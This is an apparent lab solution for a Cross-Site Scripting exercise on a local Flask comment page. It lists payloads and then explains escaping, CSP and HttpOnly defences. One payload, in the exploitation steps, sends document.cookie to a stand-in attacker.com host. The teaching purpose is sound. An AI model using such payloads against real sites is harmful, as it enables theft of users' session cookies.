# Cross-Site Scripting (XSS) Exercise Solution

## Objective
The objective of this exercise is to demonstrate how Cross-Site Scripting (XSS) vulnerabilities can be exploited and how to prevent them.

## Exploitation
1. Access the XSS Demonstration page at `http://localhost:8081`.
2. In the comment input field, enter the following payload:
   ```html
   <script>alert('XSS');</script>
   ```
3. Submit the comment and observe that the JavaScript executes, displaying an alert box.
4. Try more advanced payloads, such as:
   ```html
   <img src="x" onerror="alert('XSS via image');">
   ```
   or
   ```html
   <svg onload="fetch('http://attacker.com/steal?cookie='+document.cookie)">
   ```

## Explanation
The application is vulnerable to XSS because it directly renders user input without proper sanitization. The `{{ comments|safe }}` in the template explicitly marks the content as safe, bypassing Flask's automatic escaping.

## Prevention
To prevent XSS vulnerabilities, implement the following measures:

1. Input Validation and Sanitization:
   ```python
   from flask import escape

   @app.route('/', methods=['GET', 'POST'])
   def submit_comment():
       if request.method == 'POST':
           comment = request.form.get('comment')
           if comment:
               comments.append(escape(comment))
       return render_template_string(xss_template, comments="<br>".join(comments))
   ```

2. Content Security Policy (CSP):
   Add the following header to your responses:
   ```python
   @app.after_request
   def add_security_headers(resp):
       resp.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'none'"
       return resp
   ```

3. Use Safe Template Rendering:
   Instead of `{{ comments|safe }}`, use `{{ comments }}` to enable automatic escaping.

4. HTTPOnly Cookies:
   Set cookies with the HTTPOnly flag to prevent JavaScript access:
   ```python
   from flask import make_response

   @app.route('/set_cookie')
   def set_cookie():
       resp = make_response("Cookie set")
       resp.set_cookie('session', 'value', httponly=True)
       return resp
   ```

## Additional Prevention Measures
1. Implement input length restrictions to limit the potential for large payloads.
2. Use a Web Application Firewall (WAF) to filter out common XSS patterns.
3. Regularly update and patch all dependencies to protect against known vulnerabilities.
4. Educate developers about secure coding practices and the risks of XSS.

## Conclusion
This exercise demonstrates the dangers of rendering unsanitized user input. Always validate and sanitize user input, use secure template rendering, and implement additional security measures like CSP to protect your applications from XSS attacks.
